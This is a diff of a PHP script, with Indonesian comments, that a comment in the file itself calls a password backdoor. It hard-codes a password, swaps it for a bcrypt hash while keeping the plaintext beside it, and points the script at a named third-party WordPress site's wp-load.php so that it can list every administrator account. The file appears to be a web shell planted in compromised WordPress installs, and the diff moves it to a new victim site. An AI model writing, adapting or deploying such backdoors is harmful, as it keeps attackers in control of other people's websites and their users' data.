@@ -1,15 +1,18 @@
 <?php
 session_start();
 
-$ewean = "Superbone@123"; // password backdoor
+// Contoh hash Bcrypt yang valid (disimpan dengan aman)
+$captainmaya = '$2y$10$Gv3G0stZBJWYbZSRP8fVdOUfnO8DhQ/vuI4/3CIyTZ6373E6OL/Ja'; //Superbone@123
 
-// Jika form password dikirim
 if (isset($_POST["password"])) {
-    // Jika password benar
-    if ($_POST["password"] === $ewean) {
+    $input_pengguna = $_POST["password"];
+
+    // Memverifikasi input polos dengan hash Bcrypt
+    if (password_verify($input_pengguna, $captainmaya)) {
         $_SESSION["authenticated"] = true;
+        echo "Autentikasi berhasil.";
     } else {
-        $error_msg = "Password salah!";
+        echo "Kata sandi salah.";
     }
 }
 
@@ -17,8 +20,8 @@ if (isset($_POST["password"])) {
 if (isset($_SESSION["authenticated"]) && $_SESSION["authenticated"] === true) {
     
     // Pastikan jalur file wp-load.php ini sudah benar sesuai server Anda
-    if (file_exists("/home/99044.cloudwaysapps.com/kmzzsugsvu/public_html/wp-load.php")) {
-        require_once "/home/99044.cloudwaysapps.com/kmzzsugsvu/public_html/wp-load.php";
+    if (file_exists("/srv/var/www/vhosts/ooe-passionsspiele.at/httpdocs/wp-load.php")) {
+        require_once "/srv/var/www/vhosts/ooe-passionsspiele.at/httpdocs/wp-load.php";
 
         // Ambil semua user ber-role administrator
         $admins = get_users(array("role" => "administrator"));
@@ -122,3 +125,5 @@ if (isset($_SESSION["authenticated"]) && $_SESSION["authenticated"] === true) {
 </div>
 </body>
 </html>
+
+
